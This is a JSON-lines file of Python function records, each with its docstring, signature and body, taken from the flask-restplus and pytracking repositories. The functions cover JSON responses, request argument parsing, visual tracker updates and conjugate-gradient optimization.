{"docstring": "'''Makes a Flask response with a JSON encoded body'''\n\n", "func_signal": "def output_json(data, code, headers=None):\n", "code": "settings = current_app.config.get('RESTPLUS_JSON', {})\n\n# If we're in debug mode, and the indent is not set, we set it to a\n# reasonable value here.  Note that this won't override any existing value\n# that was set.\nif current_app.debug:\n    settings.setdefault('indent', 4)\n\n# always end the json dumps with a new line\n# see https://github.com/mitsuhiko/flask/pull/1262\ndumped = dumps(data, **settings) + \"\\n\"\n\nresp = make_response(dumped, code)\nresp.headers.extend(headers or {})\nreturn resp", "path": "flask-restplus/flask_restplus/representations.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nTurns an RFC822 formatted date into a datetime object.\n\nExample::\n\n    inputs.datetime_from_rfc822('Wed, 02 Oct 2002 08:00:00 EST')\n\n:param str value: The RFC822-complying string to transform\n:return: The parsed datetime\n:rtype: datetime\n:raises ValueError: if value is an invalid date literal\n\n'''\n", "func_signal": "def datetime_from_rfc822(value):\n", "code": "raw = value\nif not time_regex.search(value):\n    value = ' '.join((value, '00:00:00'))\ntry:\n    timetuple = parsedate_tz(value)\n    timestamp = mktime_tz(timetuple)\n    if timetuple[-1] is None:\n        return datetime.fromtimestamp(timestamp).replace(tzinfo=pytz.utc)\n    else:\n        return datetime.fromtimestamp(timestamp, pytz.utc)\nexcept Exception:\n    raise ValueError('Invalid date literal \"{0}\"'.format(raw))", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nParses argument value(s) from the request, converting according to\nthe argument's type.\n\n:param request: The flask request object to parse arguments from\n:param bool bundle_errors: do not abort when first error occurs, return a\n    dict with the name of the argument and the error message to be\n    bundled\n'''\n", "func_signal": "def parse(self, request, bundle_errors=False):\n", "code": "bundle_errors = current_app.config.get('BUNDLE_ERRORS', False) or bundle_errors\nsource = self.source(request)\n\nresults = []\n\n# Sentinels\n_not_found = False\n_found = True\n\nfor operator in self.operators:\n    name = self.name + operator.replace('=', '', 1)\n    if name in source:\n        # Account for MultiDict and regular dict\n        if hasattr(source, 'getlist'):\n            values = source.getlist(name)\n        else:\n            values = [source.get(name)]\n\n        for value in values:\n            if hasattr(value, 'strip') and self.trim:\n                value = value.strip()\n            if hasattr(value, 'lower') and not self.case_sensitive:\n                value = value.lower()\n\n                if hasattr(self.choices, '__iter__'):\n                    self.choices = [choice.lower() for choice in self.choices]\n\n            try:\n                if self.action == 'split':\n                    value = [self.convert(v, operator) for v in value.split(SPLIT_CHAR)]\n                else:\n                    value = self.convert(value, operator)\n            except Exception as error:\n                if self.ignore:\n                    continue\n                return self.handle_validation_error(error, bundle_errors)\n\n            if self.choices and value not in self.choices:\n                msg = 'The value \\'{0}\\' is not a valid choice for \\'{1}\\'.'.format(value, name)\n                return self.handle_validation_error(msg, bundle_errors)\n\n            if name in request.unparsed_arguments:\n                request.unparsed_arguments.pop(name)\n            results.append(value)\n\nif not results and self.required:\n    if isinstance(self.location, six.string_types):\n        location = _friendly_location.get(self.location, self.location)\n    else:\n        locations = [_friendly_location.get(loc, loc) for loc in self.location]\n        location = ' or '.join(locations)\n    error_msg = 'Missing required parameter in {0}'.format(location)\n    return self.handle_validation_error(error_msg, bundle_errors)\n\nif not results:\n    if callable(self.default):\n        return self.default(), _not_found\n    else:\n        return self.default, _not_found\n\nif self.action == 'append':\n    return results, _found\n\nif self.action == 'store' or len(results) == 1:\n    return results[0], _found\nreturn results, _found", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Replace the argument matching the given name with a new version.'''\n", "func_signal": "def replace_argument(self, name, *args, **kwargs):\n", "code": "new_arg = self.argument_class(name, *args, **kwargs)\nfor index, arg in enumerate(self.args[:]):\n    if new_arg.name == arg.name:\n        del self.args[index]\n        self.args.append(new_arg)\n        break\nreturn self", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "\"\"\"Get the target bounding boxes for the initial augmented samples.\"\"\"\n", "func_signal": "def init_target_boxes(self):\n", "code": "self.classifier_target_box = self.get_iounet_box(self.pos, self.target_sz, self.init_sample_pos, self.init_sample_scale)\ninit_target_boxes = TensorList()\nfor T in self.transforms:\n    init_target_boxes.append(self.classifier_target_box + torch.Tensor([T.shift[1], T.shift[0], 0, 0]))\ninit_target_boxes = torch.cat(init_target_boxes.view(1, 4), 0).to(self.params.device)\nself.target_boxes = init_target_boxes.new_zeros(self.params.sample_memory_size, 4)\nself.target_boxes[:init_target_boxes.shape[0],:] = init_target_boxes\nreturn init_target_boxes", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Update weights and get index to replace\n", "func_signal": "def update_sample_weights(self, sample_weights, previous_replace_ind, num_stored_samples, num_init_samples, learning_rate = None):\n", "code": "replace_ind = []\nfor sw, prev_ind, num_samp, num_init in zip(sample_weights, previous_replace_ind, num_stored_samples, num_init_samples):\n    lr = learning_rate\n    if lr is None:\n        lr = self.params.learning_rate\n\n    init_samp_weight = self.params.get('init_samples_minimum_weight', None)\n    if init_samp_weight == 0:\n        init_samp_weight = None\n    s_ind = 0 if init_samp_weight is None else num_init\n\n    if num_samp == 0 or lr == 1:\n        sw[:] = 0\n        sw[0] = 1\n        r_ind = 0\n    else:\n        # Get index to replace\n        if num_samp < sw.shape[0]:\n            r_ind = num_samp\n        else:\n            _, r_ind = torch.min(sw[s_ind:], 0)\n            r_ind = r_ind.item() + s_ind\n\n        # Update weights\n        if prev_ind is None:\n            sw /= 1 - lr\n            sw[r_ind] = lr\n        else:\n            sw[r_ind] = sw[prev_ind] / (1 - lr)\n\n    sw /= sw.sum()\n    if init_samp_weight is not None and sw[:num_init].sum() < init_samp_weight:\n        sw /= init_samp_weight + sw[num_init:].sum()\n        sw[:num_init] = init_samp_weight / num_init\n\n    replace_ind.append(r_ind)\n\nreturn replace_ind", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Get the center position for the new sample. Make sure the target is correctly centered.\"\"\"\n", "func_signal": "def get_centered_sample_pos(self):\n", "code": "return self.pos + ((self.feature_sz + self.kernel_size) % 2) * self.target_scale * \\\n       self.img_support_sz / (2*self.feature_sz)", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Main conjugate gradient method.\n\nargs:\n    num_iter: Number of iterations.\n    x: Initial guess. Assumed zero if None.\n    eps: Stop if the residual norm gets smaller than this.\n\"\"\"\n\n# Apply forgetting factor\n", "func_signal": "def run_CG(self, num_iter, x=None, eps=0.0):\n", "code": "if self.direction_forget_factor == 0:\n    self.reset_state()\nelif self.p is not None:\n    self.rho /= self.direction_forget_factor\n\nif x is None:\n    r = self.b.clone()\nelse:\n    r = self.b - self.A(x)\n\n# Norms of residuals etc for debugging\nresvec = None\nif self.debug:\n    normr = self.residual_norm(r)\n    resvec = torch.zeros(num_iter+1)\n    resvec[0] = normr\n\n# Loop over iterations\nfor ii in range(num_iter):\n    # Preconditioners\n    y = self.M1(r)\n    z = self.M2(y)\n\n    rho1 = self.rho\n    self.rho = self.ip(r, z)\n\n    if self.check_zero(self.rho):\n        if self.debug:\n            print('Stopped CG since rho = 0')\n            if resvec is not None:\n                resvec = resvec[:ii+1]\n        return x, resvec\n\n    if self.p is None:\n        self.p = z.clone()\n    else:\n        if self.fletcher_reeves:\n            beta = self.rho / rho1\n        else:\n            rho2 = self.ip(self.r_prev, z)\n            beta = (self.rho - rho2) / rho1\n\n        beta = beta.clamp(0)\n        self.p = z + self.p * beta\n\n    q = self.A(self.p)\n    pq = self.ip(self.p, q)\n\n    if self.standard_alpha:\n        alpha = self.rho / pq\n    else:\n        alpha = self.ip(self.p, r) / pq\n\n    # Save old r for PR formula\n    if not self.fletcher_reeves:\n        self.r_prev = r.clone()\n\n    # Form new iterate\n    if x is None:\n        x = self.p * alpha\n    else:\n        x += self.p * alpha\n\n    if ii < num_iter - 1 or self.debug:\n        r -= q * alpha\n\n    if eps > 0.0 or self.debug:\n        normr = self.residual_norm(r)\n\n    if self.debug:\n        self.evaluate_CG_iteration(x)\n        resvec[ii+1] = normr\n\n    if eps > 0 and normr <= eps:\n        if self.debug:\n            print('Stopped CG since norm smaller than eps')\n        break\n\nif resvec is not None:\n    resvec = resvec[:ii+2]\n\nreturn x, resvec", "path": "pytracking/pytracking/libs/optimization.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Get classification features\n", "func_signal": "def init_classifier(self, init_backbone_feat):\n", "code": "x = self.get_classification_features(init_backbone_feat)\n\n# Set regularization weight and initializer\nif hasattr(self.net, 'classifier'):\n    pred_module = getattr(self.net.classifier.filter_optimizer, 'score_predictor', self.net.classifier.filter_optimizer)\nelif hasattr(self.net, 'dimp_classifier'):\n    self.net.classifier = self.net.dimp_classifier\n    pred_module = getattr(self.net.dimp_classifier.filter_optimizer, 'score_predictor',\n                          self.net.dimp_classifier.filter_optimizer)\nelse:\n    raise NotImplementedError\n\nif self.params.get('label_threshold', None) is not None:\n    self.net.classifier.filter_optimizer.label_threshold = self.params.label_threshold\nif self.params.get('label_shrink', None) is not None:\n    self.net.classifier.filter_optimizer.label_shrink = self.params.label_shrink\nif self.params.get('softmax_reg', None) is not None:\n    self.net.classifier.filter_optimizer.softmax_reg = self.params.softmax_reg\nif self.params.get('filter_reg', None) is not None:\n    pred_module.filter_reg[0] = self.params.filter_reg\n    pred_module.min_filter_reg = self.params.filter_reg\nif self.params.get('filter_init_zero', False):\n    self.net.classifier.filter_initializer = FilterInitializerZero(self.net.classifier.filter_size, x.shape[-3])\n\n# Add the dropout augmentation here, since it requires extraction of the classification features\nif 'dropout' in self.params.augmentation and self.params.get('use_augmentation', True):\n    num, prob = self.params.augmentation['dropout']\n    self.transforms.extend(self.transforms[:1]*num)\n    x = torch.cat([x, F.dropout2d(x[0:1,...].expand(num,-1,-1,-1), p=prob, training=True)])\n\n# Set feature size and other related sizes\nself.feature_sz = torch.Tensor(list(x.shape[-2:]))\nksz = self.net.classifier.filter_size\nself.kernel_size = torch.Tensor([ksz, ksz] if isinstance(ksz, (int, float)) else ksz)\nself.output_sz = self.feature_sz #+ (self.kernel_size + 1)%2\n\n# Construct output window\nself.output_window = None\nif self.params.get('window_output', False):\n    score_map_sz = self.feature_sz + (self.kernel_size + 1)%2\n    if self.params.get('use_clipped_window', False):\n        self.output_window = dcf.hann2d_clipped(score_map_sz.long(), (score_map_sz*self.params.effective_search_area / self.params.search_area_scale).long(), centered=True).to(self.params.device)\n    else:\n        self.output_window = dcf.hann2d(score_map_sz.long(), centered=True).to(self.params.device)\n\n    self.output_window = self.output_window.squeeze(0)[:, :-1, :-1]\n    if self.params.get('windom_clamp_factor', None) is not None:\n        self.output_window = (self.output_window * (1.0 / self.params.get('windom_clamp_factor'))).clamp(0.0, 1.0)\n\n# Get target boxes for the different augmentations\ntarget_boxes = self.init_target_boxes()\n\n# Set number of iterations\nplot_loss = self.params.debug > 0\nnum_iter = self.params.get('net_opt_iter', None)\n\n# Get target filter by running the discriminative model prediction module\nwith torch.no_grad():\n    self.target_filter, _, losses = self.net.classifier.get_filter(x, target_boxes, num_iter=num_iter,\n                                                                   compute_losses=plot_loss)\n\n# Init memory\nif self.params.get('update_classifier', True):\n    self.init_memory(TensorList([x]))\n\nif plot_loss:\n    if isinstance(losses, dict):\n        losses = losses['train']\n    self.losses = torch.stack(losses)\n    if self.visdom is not None:\n        self.visdom.register((self.losses, torch.arange(self.losses.numel())), 'lineplot', 3, 'Training Loss' + self.id_str)\n    elif self.params.debug >= 3:\n        plot_graph(self.losses, 10, title='Training Loss' + self.id_str)", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"\nargs:\n    fun_name - The function which returns the network\n    fun_module - the module which contains the network function\n    args - arguments which are passed to the network function\n    kwds - arguments which are passed to the network function\n\"\"\"\n", "func_signal": "def __init__(self, fun_name, fun_module, args, kwds):\n", "code": "self.fun_name = fun_name\nself.fun_module = fun_module\nself.args = args\nself.kwds = kwds", "path": "pytracking/ltr/admin/model_constructor.py", "commit_date": "2019-04-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Run the ATOM IoUNet to refine the target bounding box.\"\"\"\n\n# Initial box for refinement\n", "func_signal": "def refine_target_box(self, backbone_feat, sample_pos, sample_scale, scale_ind, update_scale = True):\n", "code": "init_box = self.get_iounet_box(self.pos, self.target_sz, sample_pos, sample_scale)\n\n# Extract features from the relevant scale\niou_features = self.get_iou_features(backbone_feat)\niou_features = TensorList([x[scale_ind:scale_ind+1,...] for x in iou_features])\n\n# Generate random initial boxes\ninit_boxes = init_box.view(1,4).clone()\nif self.params.num_init_random_boxes > 0:\n    square_box_sz = init_box[2:].prod().sqrt()\n    rand_factor = square_box_sz * torch.cat([self.params.box_jitter_pos * torch.ones(2), self.params.box_jitter_sz * torch.ones(2)])\n\n    minimal_edge_size = init_box[2:].min()/3\n    rand_bb = (torch.rand(self.params.num_init_random_boxes, 4) - 0.5) * rand_factor\n    new_sz = (init_box[2:] + rand_bb[:,2:]).clamp(minimal_edge_size)\n    new_center = (init_box[:2] + init_box[2:]/2) + rand_bb[:,:2]\n    init_boxes = torch.cat([new_center - new_sz/2, new_sz], 1)\n    init_boxes = torch.cat([init_box.view(1,4), init_boxes])\n\n# Optimize the boxes\noutput_boxes, output_iou = self.optimize_boxes(iou_features, init_boxes)\n\n# Remove weird boxes\noutput_boxes[:, 2:].clamp_(1)\naspect_ratio = output_boxes[:,2] / output_boxes[:,3]\nkeep_ind = (aspect_ratio < self.params.maximal_aspect_ratio) * (aspect_ratio > 1/self.params.maximal_aspect_ratio)\noutput_boxes = output_boxes[keep_ind,:]\noutput_iou = output_iou[keep_ind]\n\n# If no box found\nif output_boxes.shape[0] == 0:\n    return\n\n# Predict box\nk = self.params.get('iounet_k', 5)\ntopk = min(k, output_boxes.shape[0])\n_, inds = torch.topk(output_iou, topk)\npredicted_box = output_boxes[inds, :].mean(0)\npredicted_iou = output_iou.view(-1, 1)[inds, :].mean(0)\n\n# Get new position and size\nnew_pos = predicted_box[:2] + predicted_box[2:] / 2\nnew_pos = (new_pos.flip((0,)) - (self.img_sample_sz - 1) / 2) * sample_scale + sample_pos\nnew_target_sz = predicted_box[2:].flip((0,)) * sample_scale\nnew_scale = torch.sqrt(new_target_sz.prod() / self.base_target_sz.prod())\n\nself.pos_iounet = new_pos.clone()\n\nif self.params.get('use_iounet_pos_for_learning', True):\n    self.pos = new_pos.clone()\n\nself.target_sz = new_target_sz\n\nif update_scale:\n    if self.params.has('target_scale_update_rate'):\n        self.target_scale = new_scale*self.params.target_scale_update_rate + \\\n                            self.target_scale*(1 - self.params.target_scale_update_rate)\n    else:\n        self.target_scale = new_scale", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Optimize iounet boxes\n", "func_signal": "def optimize_boxes_default(self, iou_features, init_boxes):\n", "code": "output_boxes = init_boxes.view(1, -1, 4).to(self.params.device)\nstep_length = self.params.box_refinement_step_length\nif isinstance(step_length, (tuple, list)):\n    step_length = torch.Tensor([step_length[0], step_length[0], step_length[1], step_length[1]],\n                               device=self.params.device).view(1,1,4)\n\nfor i_ in range(self.params.box_refinement_iter):\n    # forward pass\n    bb_init = output_boxes.clone().detach()\n    bb_init.requires_grad = True\n\n    outputs = self.net.bb_regressor.predict_iou(self.iou_modulation, iou_features, bb_init)\n\n    if isinstance(outputs, (list, tuple)):\n        outputs = outputs[0]\n\n    outputs.backward(gradient = torch.ones_like(outputs))\n\n    # Update proposal\n    output_boxes = bb_init + step_length * bb_init.grad * bb_init[:, :, 2:].repeat(1, 1, 2)\n    output_boxes.detach_()\n\n    step_length *= self.params.box_refinement_step_decay\n\nreturn output_boxes.view(-1,4).cpu(), outputs.detach().view(-1).cpu()", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"The continuous Fourier transform of a cubic spline kernel.\"\"\"\n\n", "func_signal": "def cubic_spline_fourier(f, a):\n", "code": "bf = (6*(1 - torch.cos(2 * math.pi * f)) + 3*a*(1 - torch.cos(4 * math.pi * f))\n       - (6 + 8*a)*math.pi*f*torch.sin(2 * math.pi * f) - 2*a*math.pi*f*torch.sin(4 * math.pi * f)) \\\n     / (4 * math.pi**4 * f**4)\n\nbf[f == 0] = 1\n\nreturn bf", "path": "pytracking/pytracking/libs/dcf.py", "commit_date": "2020-12-05 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Runs a single GN iteration.\"\"\"\n\n", "func_signal": "def run_GN_iter(self, num_cg_iter):\n", "code": "self.x.requires_grad_(True)\n\n# Evaluate function at current estimate\nself.f0 = self.problem(self.x)\n\n# Create copy with graph detached\nself.g = self.f0.detach()\n\nif self.debug and not self.analyze_convergence:\n    loss = self.problem.ip_output(self.g, self.g)\n    self.losses = torch.cat((self.losses, loss.detach().cpu().view(-1)))\n\nself.g.requires_grad_(True)\n\n# Get df/dx^t @ f0\nself.dfdxt_g = TensorList(torch.autograd.grad(self.f0, self.x, self.g, create_graph=True))\n\n# Get the right hand side\nself.b = - self.dfdxt_g.detach()\n\n# Run CG\ndelta_x, res = self.run_CG(num_cg_iter, eps=self.cg_eps)\n\nself.x.detach_()\nself.x += delta_x\n\nif self.debug:\n    self.residuals = torch.cat((self.residuals, res))", "path": "pytracking/pytracking/libs/optimization.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Get the location of the extracted sample.\"\"\"\n", "func_signal": "def get_sample_location(self, sample_coord):\n", "code": "sample_coord = sample_coord.float()\nsample_pos = 0.5*(sample_coord[:,:2] + sample_coord[:,2:] - 1)\nsample_scales = ((sample_coord[:,2:] - sample_coord[:,:2]) / self.img_sample_sz).prod(dim=1).sqrt()\nreturn sample_pos, sample_scales", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Compute hard negatives using the dimp score\n", "func_signal": "def perform_hn_mining_dimp(self, score_dimp, max_disp1, sample_scales):\n", "code": "sample_scale = sample_scales[0]\nsz = score_dimp.shape[-2:]\n\nmax_score1 = score_dimp[0, max_disp1[0].long(), max_disp1[1].long()]\n\ntarget_neigh_sz = self.params.target_neighborhood_scale_safe * (\n            self.target_sz.prod().sqrt().repeat(2) / sample_scale) * (\n                          self.output_sz / self.img_support_sz)\n\ntneigh_top = max(round(max_disp1[0].item() - target_neigh_sz[0].item() / 2), 0)\ntneigh_bottom = min(round(max_disp1[0].item() + target_neigh_sz[0].item() / 2 + 1), sz[0])\ntneigh_left = max(round(max_disp1[1].item() - target_neigh_sz[1].item() / 2), 0)\ntneigh_right = min(round(max_disp1[1].item() + target_neigh_sz[1].item() / 2 + 1), sz[1])\n\nscale_ind = 0\nscores_masked = score_dimp[scale_ind:scale_ind + 1, ...].clone()\nscores_masked[..., tneigh_top:tneigh_bottom, tneigh_left:tneigh_right] = 0\n\n# Find new maximum\nmax_score2, max_disp2 = dcf.max2d(scores_masked)\n\nif max_score2 > self.params.hard_negative_threshold * max_score1 and max_score2 > 0.1:\n    return True\nreturn False", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Run the target localization.\"\"\"\n", "func_signal": "def localize_target(self, score_fused, score_dimp, sample_scales):\n", "code": "if score_fused is not None:\n    score_fused = score_fused[0]\nscore_dimp = score_dimp[0]\n\n# Apply window function\nif self.output_window is not None and score_fused is not None:\n    score_dimp_win = score_dimp * self.output_window\nelse:\n    score_dimp_win = score_dimp\n\nmax_dimp_score = score_dimp.max().item()\nmax_id = score_fused.view(-1).argmax()\n\ndimp_score_at_loc = score_dimp_win.view(-1)[max_id].item()\nself.debug_info['dimp_score_at_loc'] = dimp_score_at_loc\nself.debug_info['max_dimp_score'] = max_dimp_score\n\nloc_params = {'target_not_found_threshold': self.params.target_not_found_threshold_fused}\n\ntranslation_vec, scale_ind, scores, max_dimp_score, flag, max_disp1 = self.compute_target_location(\n    score_fused, loc_params, sample_scales, score_dimp_win)\n\nself.debug_info['fused_score'] = max_dimp_score\nself.debug_info['fused_flag'] = flag\n\nif self.params.get('perform_hn_mining_dimp', False) and flag != 'not_found':\n    hn_flag = self.perform_hn_mining_dimp(score_dimp, max_disp1, sample_scales)\n\n    if hn_flag:\n        flag = 'hard_negative'\n\nreturn translation_vec, scale_ind, scores, flag", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Set flags and learning rate\n", "func_signal": "def update_classifier(self, train_x, target_box, learning_rate=None, scores=None):\n", "code": "hard_negative_flag = learning_rate is not None\nif learning_rate is None:\n    learning_rate = self.params.learning_rate\n\n# Update the tracker memory\nif hard_negative_flag or self.frame_num % self.params.get('train_sample_interval', 1) == 0:\n    self.update_memory(TensorList([train_x]), target_box, learning_rate)\n\n# Decide the number of iterations to run\nnum_iter = 0\nif hard_negative_flag:\n    num_iter = self.params.get('net_opt_hn_iter', None)\nelif (self.frame_num - 1) % self.params.train_skipping == 0:\n    num_iter = self.params.get('net_opt_update_iter', None)\n\nplot_loss = self.params.debug > 0\n\nif num_iter > 0:\n    # Get inputs for the DiMP filter optimizer module\n    samples = self.training_samples[0][:self.num_stored_samples[0],...]\n    target_boxes = self.target_boxes[:self.num_stored_samples[0],:].clone()\n    sample_weights = self.sample_weights[0][:self.num_stored_samples[0]]\n\n    # Run the filter optimizer module\n    with torch.no_grad():\n        self.target_filter, _, losses = self.net.classifier.filter_optimizer(self.target_filter,\n                                                                             num_iter=num_iter, feat=samples,\n                                                                             bb=target_boxes,\n                                                                             sample_weight=sample_weights,\n                                                                             compute_losses=plot_loss)\n\n    if plot_loss:\n        if isinstance(losses, dict):\n            losses = losses['train']\n        self.losses = torch.cat((self.losses, torch.stack(losses)))\n        if self.visdom is not None:\n            self.visdom.register((self.losses, torch.arange(self.losses.numel())), 'lineplot', 3, 'Training Loss' + self.id_str)\n        elif self.params.debug >= 3:\n            plot_graph(self.losses, 10, title='Training Loss' + self.id_str)", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Reset state in case of long occlusions\n", "func_signal": "def reset_state(self):\n", "code": "if self.info_dict['state'] is not None:\n    self.info_dict['state'] = self.info_dict['state'] * 0.0", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Run the optimizer with the provided number of iterations.\"\"\"\n\n", "func_signal": "def run(self, num_cg_iter):\n", "code": "if num_cg_iter == 0:\n    return\n\nlossvec = None\nif self.debug:\n    lossvec = torch.zeros(2)\n\nself.x.requires_grad_(True)\n\n# Evaluate function at current estimate\nself.f0 = self.problem(self.x)\n\n# Create copy with graph detached\nself.g = self.f0.detach()\n\nif self.debug:\n    lossvec[0] = self.problem.ip_output(self.g, self.g)\n\nself.g.requires_grad_(True)\n\n# Get df/dx^t @ f0\nself.dfdxt_g = TensorList(torch.autograd.grad(self.f0, self.x, self.g, create_graph=True))\n\n# Get the right hand side\nself.b = - self.dfdxt_g.detach()\n\n# Run CG\ndelta_x, res = self.run_CG(num_cg_iter, eps=self.cg_eps)\n\nself.x.detach_()\nself.x += delta_x\n\nif self.debug:\n    self.f0 = self.problem(self.x)\n    lossvec[-1] = self.problem.ip_output(self.f0, self.f0)\n    self.residuals = torch.cat((self.residuals, res))\n    self.losses = torch.cat((self.losses, lossvec))\n    if self.visdom is not None:\n        self.visdom.register(self.losses, 'lineplot', 3, 'Loss')\n        self.visdom.register(self.residuals, 'lineplot', 3, 'CG residuals')\n    elif self.plotting:\n        plot_graph(self.losses, self.fig_num[0], title='Loss')\n        plot_graph(self.residuals, self.fig_num[1], title='CG residuals')\n\nself.x.detach_()\nself.clear_temp()", "path": "pytracking/pytracking/libs/optimization.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "# Update scale\n", "func_signal": "def update_state(self, new_pos, new_scale=None):\n", "code": "if new_scale is not None:\n    self.target_scale = new_scale.clamp(self.min_scale_factor, self.max_scale_factor)\n    self.target_sz = self.base_target_sz * self.target_scale\n\n# Update pos\ninside_ratio = self.params.get('target_inside_ratio', 0.2)\ninside_offset = (inside_ratio - 0.5) * self.target_sz\nself.pos = torch.max(torch.min(new_pos, self.image_sz - inside_offset), inside_offset)", "path": "pytracking/pytracking/tracker/kys/kys.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\"Run the optimizer.\nargs:\n    num_cg_iter: Number of CG iterations per GN iter. If list, then each entry specifies number of CG iterations\n                 and number of GN iterations is given by the length of the list.\n    num_gn_iter: Number of GN iterations. Shall only be given if num_cg_iter is an integer.\n\"\"\"\n\n", "func_signal": "def run(self, num_cg_iter, num_gn_iter=None):\n", "code": "if isinstance(num_cg_iter, int):\n    if num_gn_iter is None:\n        raise ValueError('Must specify number of GN iter if CG iter is constant')\n    num_cg_iter = [num_cg_iter]*num_gn_iter\n\nnum_gn_iter = len(num_cg_iter)\nif num_gn_iter == 0:\n    return\n\nif self.analyze_convergence:\n    self.evaluate_CG_iteration(0)\n\n# Outer loop for running the GN iterations.\nfor cg_iter in num_cg_iter:\n    self.run_GN_iter(cg_iter)\n\nif self.debug:\n    if not self.analyze_convergence:\n        self.f0 = self.problem(self.x)\n        loss = self.problem.ip_output(self.f0, self.f0)\n        self.losses = torch.cat((self.losses, loss.detach().cpu().view(-1)))\n\n    if self.visdom is not None:\n        self.visdom.register(self.losses, 'lineplot', 3, 'Loss')\n        self.visdom.register(self.residuals, 'lineplot', 3, 'CG residuals')\n\n        if self.analyze_convergence:\n            self.visdom.register(self.gradient_mags, 'lineplot', 4, 'Gradient magnitude')\n    elif self.plotting:\n        plot_graph(self.losses, self.fig_num[0], title='Loss')\n        plot_graph(self.residuals, self.fig_num[1], title='CG residuals')\n        if self.analyze_convergence:\n            plot_graph(self.gradient_mags, self.fig_num[2], 'Gradient magnitude')\n\n\nself.x.detach_()\nself.clear_temp()\n\nreturn self.losses, self.residuals", "path": "pytracking/pytracking/libs/optimization.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
{"docstring": "\"\"\" Wraps the function 'f' which returns the network. An extra field 'constructor' is added to the network returned\nby 'f'. This field contains an instance of the  'NetConstructor' class, which contains the information needed to\nre-construct the network, such as the name of the function 'f', the function arguments etc. Thus, the network can\nbe easily constructed from a saved checkpoint by calling NetConstructor.get() function.\n\"\"\"\n", "func_signal": "def model_constructor(f):\n", "code": "@wraps(f)\ndef f_wrapper(*args, **kwds):\n    net_constr = NetConstructor(f.__name__, f.__module__, args, kwds)\n    output = f(*args, **kwds)\n    if isinstance(output, (tuple, list)):\n        # Assume first argument is the network\n        output[0].constructor = net_constr\n    else:\n        output.constructor = net_constr\n    return output\nreturn f_wrapper", "path": "pytracking/ltr/admin/model_constructor.py", "commit_date": "2019-04-07 00:00:00", "repo_name": "visionml/pytracking", "stars": 3036, "license": "gpl-3.0", "language": "python", "size": 5071}
